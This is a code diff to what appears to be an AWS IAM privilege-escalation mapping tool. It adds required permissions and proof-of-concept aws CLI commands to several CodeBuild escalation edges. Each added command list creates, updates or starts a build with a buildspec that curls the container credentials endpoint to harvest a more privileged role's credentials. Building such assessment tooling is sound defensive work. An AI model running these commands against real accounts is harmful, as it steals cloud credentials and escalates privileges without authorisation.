@@ -177,7 +177,13 @@ def generate_edges_locally(nodes: List[Node], scps: Optional[List[List[dict]]] =
                             node_source,
                             node_destination,
                             '(MFA Required) can use CodeBuild with an existing project to access' if startproj_mfa else 'can use CodeBuild with an existing project to access',
-                            'CodeBuild'
+                            'CodeBuild (StartBuild)',
+                            ['codebuild:StartBuild'],
+                            [
+                                "aws codebuild start-build --project-name {} --buildspec-override "
+                                "'version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - curl "
+                                "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'".format(project['proj_arn'])
+                            ]
                         ))
                         break  # break out of iterating through projects
 
@@ -193,7 +199,13 @@ def generate_edges_locally(nodes: List[Node], scps: Optional[List[List[dict]]] =
                             node_source,
                             node_destination,
                             '(MFA Required) can use CodeBuild with an existing project to access' if startproj_mfa else 'can use CodeBuild with an existing project to access',
-                            'CodeBuild'
+                            'CodeBuild (StartBuildBatch)',
+                            ['codebuild:StartBuildBatch'],
+                            [
+                                "aws codebuild start-build-batch --project-name {} --buildspec-override "
+                                "'version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - curl "
+                                "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'".format(project['proj_arn'])
+                            ]
                         ))
                         break  # break out of iterating through projects
 
@@ -231,7 +243,17 @@ def generate_edges_locally(nodes: List[Node], scps: Optional[List[List[dict]]] =
                         node_source,
                         node_destination,
                         '(MFA Required) can create a project in CodeBuild to access' if create_proj_mfa or pass_role_mfa else 'can create a project in CodeBuild to access',
-                        'CodeBuild'
+                        'CodeBuild (CreateProject, StartBuild, PassRole)',
+                        ['iam:PassRole', 'codebuild:CreateProject', 'codebuild:StartBuild'],
+                        [
+                            'aws codebuild create-project --name pmapper-poc --source type=NO_SOURCE '
+                            '--artifacts type=NO_ARTIFACTS --environment '
+                            'type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL '
+                            '--service-role {}'.format(node_destination.arn),
+                            "aws codebuild start-build --project-name pmapper-poc --buildspec-override "
+                            "'version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - curl "
+                            "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'"
+                        ]
                     ))
                 else:
                     batchstartproj_auth, batchstartproj_mfa = query_interface.local_check_authorization_handling_mfa(
@@ -246,7 +268,17 @@ def generate_edges_locally(nodes: List[Node], scps: Optional[List[List[dict]]] =
                             node_source,
                             node_destination,
                             '(MFA Required) can create a project in CodeBuild to access' if create_proj_mfa or pass_role_mfa else 'can create a project in CodeBuild to access',
-                            'CodeBuild'
+                            'CodeBuild (CreateProject, StartBuildBatch, PassRole)',
+                            ['iam:PassRole', 'codebuild:CreateProject', 'codebuild:StartBuildBatch'],
+                            [
+                                'aws codebuild create-project --name pmapper-poc --source type=NO_SOURCE '
+                                '--artifacts type=NO_ARTIFACTS --environment '
+                                'type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL '
+                                '--service-role {}'.format(node_destination.arn),
+                                "aws codebuild start-build-batch --project-name pmapper-poc --buildspec-override "
+                                "'version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - curl "
+                                "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'"
+                            ]
                         ))
 
             # check if the source can update a project and start a build
@@ -271,7 +303,16 @@ def generate_edges_locally(nodes: List[Node], scps: Optional[List[List[dict]]] =
                             node_source,
                             node_destination,
                             '(MFA Required) can update a project in CodeBuild to access' if create_proj_mfa or pass_role_mfa else 'can update a project in CodeBuild to access',
-                            'CodeBuild'
+                            'CodeBuild (UpdateProject, StartBuild, PassRole)',
+                            ['iam:PassRole', 'codebuild:UpdateProject', 'codebuild:StartBuild'],
+                            [
+                                'aws codebuild update-project --name {} --service-role {}'.format(
+                                    project['project_arn'], node_destination.arn
+                                ),
+                                "aws codebuild start-build --project-name {} --buildspec-override "
+                                "'version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - curl "
+                                "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'".format(project['project_arn'])
+                            ]
                         ))
                         break  # just wanna find that there exists one updatable/usable project
                     else:
@@ -287,7 +328,16 @@ def generate_edges_locally(nodes: List[Node], scps: Optional[List[List[dict]]] =
                                 node_source,
                                 node_destination,
                                 '(MFA Required) can update a project in CodeBuild to access' if create_proj_mfa or pass_role_mfa else 'can update a project in CodeBuild to access',
-                                'CodeBuild'
+                                'CodeBuild (UpdateProject, StartBuildBatch, PassRole)',
+                                ['iam:PassRole', 'codebuild:UpdateProject', 'codebuild:StartBuildBatch'],
+                                [
+                                    'aws codebuild update-project --name {} --service-role {}'.format(
+                                        project['project_arn'], node_destination.arn
+                                    ),
+                                    "aws codebuild start-build-batch --project-name {} --buildspec-override "
+                                    "'version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - curl "
+                                    "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'".format(project['project_arn'])
+                                ]
                             ))
                             break  # just wanna find that there exists one updatable/usable project
 
